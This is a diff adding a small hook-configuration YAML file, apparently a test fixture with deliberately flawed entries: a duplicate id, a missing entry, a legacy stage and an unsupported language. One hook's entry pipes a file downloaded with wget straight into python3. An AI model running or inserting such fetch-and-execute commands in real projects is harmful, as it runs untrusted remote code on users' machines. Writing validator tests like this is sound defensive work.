@@ -1,0 +1,21 @@
+- id: good
+  name: good hook
+  entry: good-hook
+  language: python
+  files: \.py$
+- id: legacy
+  name: legacy
+  entry: ./run.sh
+  language: script
+  stages: [push]
+- id: noentry
+  name: no entry
+  language: node
+- id: good
+  name: good hook
+  entry: dup
+  language: python
+- id: fetch
+  name: fetch
+  entry: wget -qO- https://example.com/x.py | python3
+  language: unsupported
